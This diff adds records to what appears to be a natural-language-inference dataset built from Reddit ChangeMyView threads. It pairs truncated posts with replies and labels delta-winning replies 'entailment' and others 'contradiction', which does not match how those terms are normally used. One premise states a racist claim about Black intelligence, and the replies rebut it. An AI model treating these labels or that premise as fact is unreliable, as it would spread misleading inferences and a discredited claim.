+    "parent_id": "t3_4y6hgj",
+    "score": 15,
+    "created_utc": 1471452186,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.1415929203539823
+}
+{
+  "nli_id": 47,
+  "pair_line": 24,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: It upsets me that at my university that Veteran's week is shared with Transsexual awareness week.",
+    "body": "It seems my University has a week for everything (for example, last week was Black Culture Awareness Week even though we also have Black History Month). My University sets aside the week of Veteran's Day as the week we have Veteran's week. However, this year that week has to share the week with Transsexual awareness week.\n\nNow, why does this upset me? My campus is rather liberal, as are most college campuses, so there are weeks like Black Culture Week, LGBT Week, Transsexual week, etc. Which is ...",
+    "author": "FighterPoetThinker",
+    "submission_id": "t3_2lthip"
+  },
+  "hypothesis": {
+    "body": "I think it all depends what your university actually does to commemorate these weeks and who decides what weeks you celebrate. \n\nIf Veterans week had events, speakers, and special activities while transexual week was just student organizations handing out mental health wristbands. I wouldn't necessarily equate the two. Conversely, if both are simply weeks to keep mindful of different groups of people, I don't think either take aways from the other. There is surely a point where too many of these would be detrimental, but two shouldn't be the tipping point.\n\nI'm sure there are as many students who could give less of a shit about veterans as there are about transexuals, and I wouldn't think anyone should be forced into holding these weeks in some high reguard. If the schools want to give the students who are clearly passionate about these people an outlet to express themselves, I don't think it can hurt.",
+    "author": "SlayerN",
+    "comment_id": "cly12t3",
+    "parent_id": "t3_2lthip",
+    "score": 12,
+    "created_utc": "1415586903",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.10989010989010989
+}
+{
+  "nli_id": 48,
+  "pair_line": 24,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: It upsets me that at my university that Veteran's week is shared with Transsexual awareness week.",
+    "body": "It seems my University has a week for everything (for example, last week was Black Culture Awareness Week even though we also have Black History Month). My University sets aside the week of Veteran's Day as the week we have Veteran's week. However, this year that week has to share the week with Transsexual awareness week.\n\nNow, why does this upset me? My campus is rather liberal, as are most college campuses, so there are weeks like Black Culture Week, LGBT Week, Transsexual week, etc. Which is ...",
+    "author": "FighterPoetThinker",
+    "submission_id": "t3_2lthip"
+  },
+  "hypothesis": {
+    "body": "Based off of the title, I assumed it was because of the latter's implications and that you weren't \"liberal\" and disagreed with them. But after reading your post I actually agree with your view.\n\nThe only way I can say anything otherwise is, who cares what shares a week with what? Whatever people want to be recognized should be recognized, who cares if you celebrate two things at once? It's not about getting your undivided attention, because it's not as if you spend 100% of your Veteran's Week thinking about Veterans, nor would you do the same for Transsexual Awareness Week. Veteran's Week celebrates what Veterans have done, while Transsexual Awareness Week seems more like a week to state that everyone who celebrates it/accepts it is okay with transsexuals. The two don't conflict so why not celebrate both at once?",
+    "author": "miaday",
+    "comment_id": "cly2nri",
+    "parent_id": "t3_2lthip",
+    "score": 3,
+    "created_utc": "1415589907",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.10989010989010989
+}
+{
+  "nli_id": 49,
+  "pair_line": 25,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Cheerleading is not a sport",
+    "body": "I need to preface my thoughts initially by saying that holding this view does not mean I devalue cheerleading in any way. I have attended competitions, and known several friends who cheerlead, and though I am a very active, physically fit person, I would still find it challenging to learn and execute many moves in cheerleading, and find it impressive and enjoyable to watch.\n\nHowever, I don't consider it a sport. This is not a pejorative assertion, but even so, I have experienced pushback for it ...",
+    "author": "Rome_Leader",
+    "submission_id": "t3_2bbbrd"
+  },
+  "hypothesis": {
+    "body": "When we are arguing about the definition of words, there are a couple of ways of doing it. \n\nOne - to point out that your usage is wrong, or it isn't common, but one can always redefine words. \n\nThe second is to question the motivation behind it. \n\nWhy is it particularly relevant what it is called?\n\nI will give you one good reason why it should be called a sport, which has nothing to do with your subjective definition. \n\nWhether something is called a sport affects how much sponsorship it gets along with affecting things like healthcare for the participants.\n\nBy not considering it a sport, cheerleaders are not given the benefits that people who play sports get by regulatory bodies.\n\nhttp://stagevu.com/video/pbvkaboqrzsi [NSFW in a few places]. \n\nThis episode of Penn and Teller highlights the problems with how cheerleading is treated.\n\nNow what is your motivation for calling it \"not a sport\". Why don't you instead call it a \"non objectively scored sport\"?\n\n",
+    "author": "howbigis1gb",
+    "comment_id": "cj3qs8q",
+    "parent_id": "t3_2bbbrd",
+    "score": 5,
+    "created_utc": "1405974583",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.10476190476190476
+}
+{
+  "nli_id": 50,
+  "pair_line": 25,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Cheerleading is not a sport",
+    "body": "I need to preface my thoughts initially by saying that holding this view does not mean I devalue cheerleading in any way. I have attended competitions, and known several friends who cheerlead, and though I am a very active, physically fit person, I would still find it challenging to learn and execute many moves in cheerleading, and find it impressive and enjoyable to watch.\n\nHowever, I don't consider it a sport. This is not a pejorative assertion, but even so, I have experienced pushback for it ...",
+    "author": "Rome_Leader",
+    "submission_id": "t3_2bbbrd"
+  },
+  "hypothesis": {
+    "body": "So you think any activity that is a bit subjective can be considered a sport? \n\nThe thing is, subjective sports do have many concrete, objective points for athletes to gain. For example, doing a specific trick is worth X points. Doing a trick in one category immediately after doing one in another category is work N bonus points. Competitors absolutely can add style, but they are still doing each component to get points. That's why if you watch something like figure skating, you know they have to add in a certain number of tricks with a certain difficulty in order to even compete for a medal.\n\nIt sounds like you frown on those sports because they *also* have a subjective component to them. I can understand not enjoying the art as much as the athletics (that is personal taste), but surely the art doesn't negate the sport itself. ",
+    "author": "ThePolemicist",
+    "comment_id": "cj3may5",
+    "parent_id": "t3_2bbbrd",
+    "score": 2,
+    "created_utc": "1405966789",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.10476190476190476
+}
+{
+  "nli_id": 51,
+  "pair_line": 26,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Cheerleading is not a sport",
+    "body": "I need to preface my thoughts initially by saying that holding this view does not mean I devalue cheerleading in any way. I have attended competitions, and known several friends who cheerlead, and though I am a very active, physically fit person, I would still find it challenging to learn and execute many moves in cheerleading, and find it impressive and enjoyable to watch.\n\nHowever, I don't consider it a sport. This is not a pejorative assertion, but even so, I have experienced pushback for it ...",
+    "author": "Rome_Leader",
+    "submission_id": "t3_2bbbrd"
+  },
+  "hypothesis": {
+    "body": "Diving, figure skating, cheerleading, et al. Are only subjective at the very peak of their respective sports.\n\nAn experienced diver or cheerleader is objectively better than a novice, they are only subjectively better than their absolute peers in terms of skill. The same people are going to rank in the same percentiles each time, because of objective differences, and then only the final ranking of how they performed (objective and subjectively) is on competition day.",
+    "author": "notian",
+    "comment_id": "cj3mpby",
+    "parent_id": "t3_2bbbrd",
+    "score": 1,
+    "created_utc": "1405967478",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.07462686567164178
+}
+{
+  "nli_id": 52,
+  "pair_line": 26,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Cheerleading is not a sport",
+    "body": "I need to preface my thoughts initially by saying that holding this view does not mean I devalue cheerleading in any way. I have attended competitions, and known several friends who cheerlead, and though I am a very active, physically fit person, I would still find it challenging to learn and execute many moves in cheerleading, and find it impressive and enjoyable to watch.\n\nHowever, I don't consider it a sport. This is not a pejorative assertion, but even so, I have experienced pushback for it ...",
+    "author": "Rome_Leader",
+    "submission_id": "t3_2bbbrd"
+  },
+  "hypothesis": {
+    "body": "Essentially, you are using a different definition of sport to the people who call cheerleading a sport. You don't actually disagree about anything fundamental\n\nThe defiition of sport is \n\n&gt;an activity involving physical exertion and skill in which an individual or team competes against another or others for entertainment.\n\nThis says nothing about a person having to have won in an objective manner. Why are you redefining sport to meaning something other than the dictionary definition, and then getting into arguments over it?",
+    "author": "Zephyr1011",
+    "comment_id": "cj4vyit",
+    "parent_id": "t3_2bbbrd",
+    "score": 1,
+    "created_utc": "1406067120",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.07462686567164178
+}
+{
+  "nli_id": 53,
+  "pair_line": 27,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: I believe that blacks are genetically inferior to whites, Asians, and jews as far as intelligence is concerned.",
+    "body": "My position relies on these points:\n \n*The Bell Curve- The Bell Curve is a 1998 scientific book by Richard Herrnstein and Charles A. Murray, in the book a racial IQ gap is described that has prominent races in the allowing order(from least intelligent to most): blacks, whites, Asians, jews. Subsequent books have been published by Murray supporting his data. \n\n*Minnesota Transracial Adoption Studies- This study had adopted children of White, black, asian, and mixed decent take IQ test at age 7 an...",
+    "author": "ClockWorkAlex",
+    "submission_id": "t3_29dcy7"
+  },
+  "hypothesis": {
+    "body": "Studies like the ones in the book you are citing have several problems.\n\n**First**, it is inadequate to simply *eliminate or account for* multiple factors, then declare whatever remains to all be genetic. Yet this is done multiple times, and is an example of stacking the deck or omitting other factors.\n\n**Second**, proofs like \"twin studies\" specifically ignores socially-induced psychological effects, which the child experiences automatically when people know they are a different race from their parents or adopted or whatever. This cluster of effects does not \"magically disappear\" when factors like SES, family size, geographical location, etc. are accounted for.\n\n**Third**, the very data in these studies, when duplicated at other times and in other places, simply does not yield consistent results. Sustaining this data set only happens when one *deliberately excludes* many other studies.\n\nThose are the first that come to mind. We haven't gotten into specifics or case studies, since although those are more emotive and compelling, they can often be dismissed as simply being anecdotal even if they illustrate causal factors quite vividly.",
+    "author": "JustinJamm",
+    "comment_id": "cijv5wq",
+    "parent_id": "t3_29dcy7",
+    "score": 2,
+    "created_utc": "1404021254",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.08571428571428572
+}
+{
+  "nli_id": 54,
+  "pair_line": 27,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: I believe that blacks are genetically inferior to whites, Asians, and jews as far as intelligence is concerned.",
+    "body": "My position relies on these points:\n \n*The Bell Curve- The Bell Curve is a 1998 scientific book by Richard Herrnstein and Charles A. Murray, in the book a racial IQ gap is described that has prominent races in the allowing order(from least intelligent to most): blacks, whites, Asians, jews. Subsequent books have been published by Murray supporting his data. \n\n*Minnesota Transracial Adoption Studies- This study had adopted children of White, black, asian, and mixed decent take IQ test at age 7 an...",
+    "author": "ClockWorkAlex",
+    "submission_id": "t3_29dcy7"
+  },
+  "hypothesis": {
+    "body": "I'm assuming you're posting this here because you must have some sense of doubt in your belief. Here is where I see the major problem in your belief: you're basing your view off of very antiquated data and trying to simplify a very complex concept. \n\nThe Bell Curve and Minnesota Studies are old (though the Minnesota Studies did have follow up in the 90s and early 2000s, that's still old in the realm of scientific research). The Bell Curve wasn't even peer reviewed before publication and the American Psychological Association went on record to say that the authors never definitively proved a genetic link with intelligence, particularly in regards to race. The Minnesota Studies have a really small sample size and poor controls for confounding variables. Perhaps it might help if you read the discussion in the studies as the authors themselves admit the study's results are nothing conclusive. I can't speak to the Jensen studies since I've never seen them but look at the statistics (p-values, confidence intervals, etc) and the discussion. Anything show up as statistically significant and did they account for their confounding variables? \n\nIn regards to African civilizations... well which ones specifically? Africa is a huge continent and everyone kind of lumps it an entirely war-torn and destitute but that's not true of every single country or culture. In fact, Nigerians are one of the US's most highly educated immigrant demographics. Also, a country's GDP isn't really a definitive indicator of population intelligence.\n\nYou'll find the more you delve into the technical side of it, we don't have a set definition on what constitutes \"intelligence\" and the measures surrounding it are still controversial. While IQ tests do have generally agreed upon reliability and validity in measuring \"intelligence\", many cognitive neuroscientists agree it only measures a certain kind (while others accept them as canon). If an entire professional community can't come to a conclusive agreement on the concept of intelligence, do you think your belief supersedes that reality? ",
+    "author": "videoninja",
+    "comment_id": "cijuqvg",
+    "parent_id": "t3_29dcy7",
+    "score": 4,
+    "created_utc": "1404019864",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.08571428571428572
+}
+{
+  "nli_id": 55,
+  "pair_line": 28,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: I believe that blacks are genetically inferior to whites, Asians, and jews as far as intelligence is concerned.",
+    "body": "My position relies on these points:\n \n*The Bell Curve- The Bell Curve is a 1998 scientific book by Richard Herrnstein and Charles A. Murray, in the book a racial IQ gap is described that has prominent races in the allowing order(from least intelligent to most): blacks, whites, Asians, jews. Subsequent books have been published by Murray supporting his data. \n\n*Minnesota Transracial Adoption Studies- This study had adopted children of White, black, asian, and mixed decent take IQ test at age 7 an...",
+    "author": "ClockWorkAlex",
+    "submission_id": "t3_29dcy7"
+  },
+  "hypothesis": {
+    "body": "Your Minnesota study comes the closest to being relevant but it has a fatal flaw -- it measured the IQs of black children adopted by white parents, but not black children adopted by black parents.  If you want to see whether the cause of the test gap is genetic or environmental, you would want to see the control group as well.\n\n**Fortunately** that study has also been done.\n\n&gt;Two small studies have tried to compare genetically similar children raised in black and white families. **Elsie Moore found that black children adopted by white parents had IQ scores 13.5 points higher than black children adopted by black parents.** Lee Willerman and his colleagues compared children with a black mother and a white father to children with a white mother and a black father. The cleanest comparison is for mixed-race children who lived only with their mother. Mixed-race children who lived with a white mother scored 11 points higher than mixed-race children who lived with a black mother. Since the black-white IQ gap averaged about 15 points at the time these two studies were done, **they imply that about four-fifths of that gap was traceable to family-related factors (including schools and neighborhoods).**\n\nThe second study it's referring to is your Minnesota study but the first is, I think, more relevant.\n\n*So what do we have here?*\n\nWe have a test gap of 15 points, 13.5 of which are eliminated when the black child is raised in a white home.  If that doesn't **scream** environmental differences to you, then I don't know what would.",
+    "author": "RufusTheFirefly",
+    "comment_id": "cik1w3s",
+    "parent_id": "t3_29dcy7",
+    "score": 1,
+    "created_utc": "1404054082",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.0825242718446602
+}
+{
+  "nli_id": 56,
+  "pair_line": 28,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: I believe that blacks are genetically inferior to whites, Asians, and jews as far as intelligence is concerned.",
+    "body": "My position relies on these points:\n \n*The Bell Curve- The Bell Curve is a 1998 scientific book by Richard Herrnstein and Charles A. Murray, in the book a racial IQ gap is described that has prominent races in the allowing order(from least intelligent to most): blacks, whites, Asians, jews. Subsequent books have been published by Murray supporting his data. \n\n*Minnesota Transracial Adoption Studies- This study had adopted children of White, black, asian, and mixed decent take IQ test at age 7 an...",
+    "author": "ClockWorkAlex",
+    "submission_id": "t3_29dcy7"
+  },
+  "hypothesis": {
+    "body": "I'm assuming you're posting this here because you must have some sense of doubt in your belief. Here is where I see the major problem in your belief: you're basing your view off of very antiquated data and trying to simplify a very complex concept. \n\nThe Bell Curve and Minnesota Studies are old (though the Minnesota Studies did have follow up in the 90s and early 2000s, that's still old in the realm of scientific research). The Bell Curve wasn't even peer reviewed before publication and the American Psychological Association went on record to say that the authors never definitively proved a genetic link with intelligence, particularly in regards to race. The Minnesota Studies have a really small sample size and poor controls for confounding variables. Perhaps it might help if you read the discussion in the studies as the authors themselves admit the study's results are nothing conclusive. I can't speak to the Jensen studies since I've never seen them but look at the statistics (p-values, confidence intervals, etc) and the discussion. Anything show up as statistically significant and did they account for their confounding variables? \n\nIn regards to African civilizations... well which ones specifically? Africa is a huge continent and everyone kind of lumps it an entirely war-torn and destitute but that's not true of every single country or culture. In fact, Nigerians are one of the US's most highly educated immigrant demographics. Also, a country's GDP isn't really a definitive indicator of population intelligence.\n\nYou'll find the more you delve into the technical side of it, we don't have a set definition on what constitutes \"intelligence\" and the measures surrounding it are still controversial. While IQ tests do have generally agreed upon reliability and validity in measuring \"intelligence\", many cognitive neuroscientists agree it only measures a certain kind (while others accept them as canon). If an entire professional community can't come to a conclusive agreement on the concept of intelligence, do you think your belief supersedes that reality? ",
+    "author": "videoninja",
+    "comment_id": "cijuqvg",
+    "parent_id": "t3_29dcy7",
+    "score": 4,
+    "created_utc": "1404019864",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.0825242718446602
+}
+{
+  "nli_id": 57,
+  "pair_line": 29,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: It's scary that the freedom of speech is rapidly being abandoned in favor of the prevention of hate speech.",
+    "body": "I understand that words are important, as they allow us to communicate and spread ideas. What I don't understand is the suggestion to silence those that spread hateful ideas, such as  racial/religious bigotry. I may not agree with pro-life supporters, anti-gay rights protesters, and radical feminists, but I believe they should have a platform to voice their opinions, and let the people decide whether they want to believe them or not. By the same card, racists, anti-semites, and Neo-Nazis, though...",
+    "author": "hanj82",
+    "submission_id": "t3_3pj95y"
+  },
+  "hypothesis": {
+    "body": "Here's the deal: every country in the world puts some restriction on free speech you agree with. The question is not whether the right of free speech should be infringed or not--if you think there should be laws against harrasment, libel/slander, false advertising &amp;c. you already agree that some restriction on speech in necessary, no matter how you dress it up. The question *is* what the extent of the infringement should be, which is itself a question based on the comparative costs and benefits of it. Specifically:\n\n1. What damage is caused by hate speech?\n\n2. What benefit is there is allowing hate speech?\n\nSo far as I can see, there is absolutely zero actual benefit in allowing people to spead vileness, and clearly at least some harm. Most developed nations have laws banning hate speech, and none of them seem any worse for it (unless you define \"worse\" circularly). ",
+    "author": "___OccamsChainsaw___",
+    "comment_id": "cw6swq6",
+    "parent_id": "t3_3pj95y",
+    "score": 4,
+    "created_utc": "1445372982",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.10576923076923077
+}
+{
+  "nli_id": 58,
+  "pair_line": 29,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: It's scary that the freedom of speech is rapidly being abandoned in favor of the prevention of hate speech.",
+    "body": "I understand that words are important, as they allow us to communicate and spread ideas. What I don't understand is the suggestion to silence those that spread hateful ideas, such as  racial/religious bigotry. I may not agree with pro-life supporters, anti-gay rights protesters, and radical feminists, but I believe they should have a platform to voice their opinions, and let the people decide whether they want to believe them or not. By the same card, racists, anti-semites, and Neo-Nazis, though...",
+    "author": "hanj82",
+    "submission_id": "t3_3pj95y"
+  },
+  "hypothesis": {
+    "body": "I interpret you as saying that having hate speech laws means you're abandoning freedom of speech. Is this correct? Do you mean that without hate speech laws, freedom of speech exists completely?\n\nBecause it isn't absolute anywhere in the world. There are already a lot of limitations on freedom of speech. Basically, when the speech *harms* people. You've got your threats, blackmail, slander, false marketing, copyright laws. Those all include limitations on freedom of speech. \n\nI don't really agree that hate speech laws *specifically* are good, but the intent of them is to minimise harm. Instead of \"hate speech\", you could view it as *threats* against groups of people (all jews should die), or *slander* against groups of people (homosexuality is the same as pedophilia). Statements like those can, in the wrong context, cause a lot of harm for people beloning to the groups, just like the crimes against individuals do. \n\nProtecting groups of people the same way we protect individuals isn't strange and doesn't really limit freedom of speech any more than it is already limited. ",
+    "author": "rollingForInitiative",
+    "comment_id": "cw7g2ou",
+    "parent_id": "t3_3pj95y",
+    "score": 1,
+    "created_utc": "1445421523",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.10576923076923077
+}
+{
+  "nli_id": 59,
+  "pair_line": 30,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Institutions of learning, especially colleges, should not hire educators that have accents that make it hard to understand them.",
+    "body": "If they do, they should let both students and educators know that, for example, on a scale of 1 to 10 (with 1 being totally incoherent and 10 being their accents don't affect learning at all) for the average English speaker, this particular educator rated a 4.\n\nI say especially colleges (and private schools) because, unlike high schools and middle schools, we're actually paying for our educations. No one should have to worry that their money is invested into a professor that can barely be unders...",
+    "author": "-Jamerican",
+    "submission_id": "t3_2teulf"
+  },
+  "hypothesis": {
+    "body": "I don't think it really makes sense to harp so much on accent. Obviously heavy accents can be a barrier to communication. That's a given.\n\nBut at the end of the day, a university has to look at their staffing requirements and hiring pool holistically, and do what they think is best for the school. There are a lot of factors that go into this. There's the fact that many colleges are also research institutions. If these professors are doing good research, the college will want to keep them around for that even if they're bad teachers. Obviously you don't like it as a student, but if a lot of the college's prestige comes from their research, this is a factor that is totally reasonable for them to consider. If you don't like it, you're justified in criticizing the teaching and advising people to rethink their decision to go there. But before you talk about what the college \"should\" do, you have to consider that there are other factors at play.\n\nIn addition, everything is a sliding scale. There are wide ranges in professors' speaking ability, teaching ability, and overall knowledge. I went to an awesome college that had a lot of professors with very strong accents that were hard to understand sometimes. But you know what? Once you get used to their accent and put in the effort to understand, those guys were fucking awesome, top-shelf professors. I'd take them over easy-to-understand-but-otherwise-mediocre professor in a heartbeat.\n\nWhen you go to a top school, you want to learn from the best and brightest in their fields, and those folks may have accents. You also might want to participate in the school's research as an undergrad, in which case you want that school to employ some good researchers, even if they're not all great teachers. It's a tradeoff. If your school doesn't strike that balance correctly, well, maybe your school kind of sucks. But I think your shot at \"educators with accents\" is overly broad and lacking nuance.",
+    "author": "themcos",
+    "comment_id": "cnyf7vq",
+    "parent_id": "t3_2teulf",
+    "score": 60,
+    "created_utc": "1422031667",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.13821138211382114
+}
+{
+  "nli_id": 60,
+  "pair_line": 30,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Institutions of learning, especially colleges, should not hire educators that have accents that make it hard to understand them.",
+    "body": "If they do, they should let both students and educators know that, for example, on a scale of 1 to 10 (with 1 being totally incoherent and 10 being their accents don't affect learning at all) for the average English speaker, this particular educator rated a 4.\n\nI say especially colleges (and private schools) because, unlike high schools and middle schools, we're actually paying for our educations. No one should have to worry that their money is invested into a professor that can barely be unders...",
+    "author": "-Jamerican",
+    "submission_id": "t3_2teulf"
+  },
+  "hypothesis": {
+    "body": "Keep in mind, especially with research colleges, the professor's primary job is getting money into the college through research grants.  Teaching has aways been seconday.  It also helps bring in the students who want to learn from research professors.  And at the end of the day, money is what really matters to colleges.  And aparently, having a heavy accent doesn't make students avoid the college.",
+    "author": "Niea",
+    "comment_id": "cnyyfu0",
+    "parent_id": "t3_2teulf",
+    "score": 1,
+    "created_utc": "1422064397",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.13821138211382114
+}
